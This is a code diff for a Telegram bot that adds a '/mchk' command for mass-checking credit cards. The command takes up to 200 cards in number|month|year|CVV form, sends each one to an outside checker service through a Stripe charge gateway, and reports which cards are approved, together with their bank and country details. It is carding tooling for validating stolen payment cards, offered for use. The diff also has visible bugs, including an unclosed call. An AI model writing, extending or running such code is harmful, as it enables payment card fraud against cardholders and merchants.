@@ -11,6 +11,8 @@ import asyncio
 from pyrogram import Client, filters, idle
 from pyrogram.types import Message
 from pyrogram.enums import ChatAction, ParseMode
+import asyncio
+from concurrent.futures import ThreadPoolExecutor
 
 # === CONFIG ===
 API_ID = 22118129
@@ -1441,6 +1443,216 @@ async def check_card(client: Client, message: Message):
     
     # Log to channel
     await log_to_channel(client, "CC", message, card, status)
+
+# === Mass CC Check Handler ===
+@app.on_message(filters.command("mchk", prefixes="/") & (filters.reply | filters.text))
+async def mass_check_handler(client: Client, message: Message):
+    try:
+        # Get the text from either replied message or command
+        if message.reply_to_message:
+            text = message.reply_to_message.text
+        else:
+            text = message.text[len("/mchk"):].strip()
+
+        # Extract CCs from the message
+        cc_list = []
+        for line in text.split('\n'):
+            if re.match(r"\d{13,16}\|\d{2}\|\d{2,4}\|\d{3,4}", line.strip()):
+                cc_list.append(line.strip())
+
+        if not cc_list:
+            await message.reply("❗ No valid CCs found in the message. Format: `CCN|MM|YY|CVV`")
+            return
+
+        # Limit to 200 CCs max
+        if len(cc_list) > 200:
+            cc_list = cc_list[:200]
+            await message.reply("⚠️ Maximum 200 CCs allowed. Checking first 200.")
+
+        # Get BIN info from first CC
+        bin_code = cc_list[0][:6]
+        brand, bank, country = get_bin_info(bin_code)
+
+        # Send initial processing message
+        processing_msg = await message.reply(
+            "✧ 𝐓𝐨𝐭𝐚𝐥↣0/{}\n"
+            "✧ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣0/{}\n"
+            "✧ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣0\n"
+            "✧ 𝐂𝐂𝐍↣0\n"
+            "✧ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣0\n"
+            "✧ 𝐄𝐫𝐫𝐨𝐫𝐬↣0\n"
+            "✧ 𝐓𝐢𝐦𝐞↣0.00 𝐒\n\n"
+            "𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n"
+            "──────── ⸙ ─────────\n"
+            "Starting mass check...".format(len(cc_list), len(cc_list))
+        
+        start_time = time.time()
+        results = []
+        checked = 0
+        approved = 0
+        ccn = 0
+        declined = 0
+        errors = 0
+
+        # Worker function to check a single CC
+        async def check_single_cc(cc):
+            nonlocal checked, approved, ccn, declined, errors
+            try:
+                headers = {
+                    'authority': 'takeshi-j8i9.onrender.com',
+                    'accept': '*/*',
+                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+                    'content-type': 'application/json',
+                    'origin': 'https://takeshi-j8i9.onrender.com',
+                    'referer': 'https://takeshi-j8i9.onrender.com/',
+                    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': '"Android"',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'same-origin',
+                    'user-agent': 'Mozilla/5.0 (Linux; Android 15; SM-X216B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+                }
+
+                json_data = {
+                    'card': cc,
+                    'site_id': None,
+                    'gateway': 'stripe_charge',
+                }
+
+                response = requests.post(
+                    'https://takeshi-j8i9.onrender.com/check_card',
+                    headers=headers,
+                    json=json_data,
+                    timeout=20
+                )
+                
+                response_json = response.json()
+                status = "❌ " + response_json.get("message", "Declined") if "status" in response_json and response_json["status"].lower() == "declined" else "✅ " + response_json.get("message", "Approved")
+                
+                if "status" in response_json:
+                    if response_json["status"].lower() == "declined":
+                        declined += 1
+                    else:
+                        approved += 1
+                        if "cnn" in response_json.get("message", "").lower():
+                            ccn += 1
+                else:
+                    status = "⚠️ Unknown response"
+                    errors += 1
+
+                results.append(f"{cc}\n𝐒𝐭𝐚𝐭𝐮𝐬➳{status}\n──────── ⸙ ─────────")
+                checked += 1
+
+            except Exception as e:
+                results.append(f"{cc}\n𝐒𝐭𝐚𝐭𝐮𝐬➳⚠️ Error: {str(e)}\n──────── ⸙ ─────────")
+                errors += 1
+                checked += 1
+
+            # Update progress every 5 CCs or when done
+            if checked % 5 == 0 or checked == len(cc_list):
+                elapsed = time.time() - start_time
+                progress_msg = (
+                    f"✧ 𝐓𝐨𝐭𝐚𝐥↣{len(cc_list)}/{len(cc_list)}\n"
+                    f"✧ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{checked}/{len(cc_list)}\n"
+                    f"✧ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{approved}\n"
+                    f"✧ 𝐂𝐂𝐍↣{ccn}\n"
+                    f"✧ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined}\n"
+                    f"✧ 𝐄𝐫𝐫𝐨𝐫𝐬↣{errors}\n"
+                    f"✧ 𝐓𝐢𝐦𝐞↣{elapsed:.2f} 𝐒\n\n"
+                    f"𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n"
+                    f"──────── ⸙ ─────────\n"
+                    + "\n".join(results[-5:])  # Show last 5 results
+                )
+                
+                try:
+                    await processing_msg.edit(progress_msg)
+                except:
+                    pass
+
+        # Process CCs with 2 workers
+        with ThreadPoolExecutor(max_workers=2) as executor:
+            loop = asyncio.get_event_loop()
+            tasks = [loop.run_in_executor(executor, lambda cc=cc: asyncio.run(check_single_cc(cc))) for cc in cc_list]
+            await asyncio.gather(*tasks)
+
+        # Final results
+        elapsed = time.time() - start_time
+        username = message.from_user.username or message.from_user.id
+        
+        # Prepare results file
+        result_text = (
+            f"Mass Check Results\n"
+            f"Total: {len(cc_list)}\n"
+            f"Approved: {approved}\n"
+            f"CCN: {ccn}\n"
+            f"Declined: {declined}\n"
+            f"Errors: {errors}\n"
+            f"Time: {elapsed:.2f}s\n\n"
+            f"BIN Info:\n"
+            f"BIN: {bin_code}\n"
+            f"Country: {country}\n"
+            f"Type: {brand}\n"
+            f"Bank: {bank}\n\n"
+            "────────────────────\n"
+            + "\n".join(results) +
+            f"\n\nChecked by: @{username}\n"
+            f"Bot by: @andr0idpie9"
+        )
+        
+        # Save to file
+        filename = f"mchk_results_{int(time.time())}.txt"
+        with open(filename, 'w') as f:
+            f.write(result_text)
+        
+        # Send final message with file
+        final_msg = (
+            f"✅ Mass Check Completed\n\n"
+            f"✧ 𝐓𝐨𝐭𝐚𝐥↣{len(cc_list)}\n"
+            f"✧ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{approved}\n"
+            f"✧ 𝐂𝐂𝐍↣{ccn}\n"
+            f"✧ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined}\n"
+            f"✧ 𝐄𝐫𝐫𝐨𝐫𝐬↣{errors}\n"
+            f"✧ 𝐓𝐢𝐦𝐞↣{elapsed:.2f}𝐒\n\n"
+            f"⌯ 𝐁𝐈𝐍 ➳ {bin_code}\n"
+            f"⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {country}\n"
+            f"⌯ 𝐓𝐲𝐩𝐞 ➳ {brand}\n"
+            f"⌯ 𝐁𝐚𝐧𝐤 ➳ {bank}\n\n"
+            f"⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ @{username}\n"
+            f"⌯ 𝐃𝐞𝐯 ⌁ @andr0idpie9"
+        )
+        
+        await message.reply_document(
+            document=filename,
+            caption=final_msg,
+            quote=True
+        )
+        
+        # Clean up
+        await processing_msg.delete()
+        os.remove(filename)
+        
+        # Log to channel
+        log_text = (
+            f"📊 **Mass CC Check Completed**\n"
+            f"**User:** [{message.from_user.first_name}](tg://user?id={message.from_user.id}) (`{message.from_user.id}`)\n"
+            f"**Total Cards:** {len(cc_list)}\n"
+            f"**Approved:** {approved}\n"
+            f"**CCN:** {ccn}\n"
+            f"**Declined:** {declined}\n"
+            f"**Errors:** {errors}\n"
+            f"**BIN:** {bin_code} ({brand}, {bank}, {country})\n"
+            f"**Time Taken:** {elapsed:.2f}s"
+        )
+        await log_to_channel(client, "CC", message, f"Mass check {len(cc_list)} cards", log_text)
+
+    except Exception as e:
+        logging.error(f"Mass check error: {e}")
+        await message.reply(f"❌ Error in mass check: {str(e)}")
+        if 'processing_msg' in locals():
+            await processing_msg.delete()
+        if 'filename' in locals() and os.path.exists(filename):
+            os.remove(filename)
 
 if __name__ == "__main__":
     print("🚀 Combined Bot is running with /ai, /chk and /gen commands...")
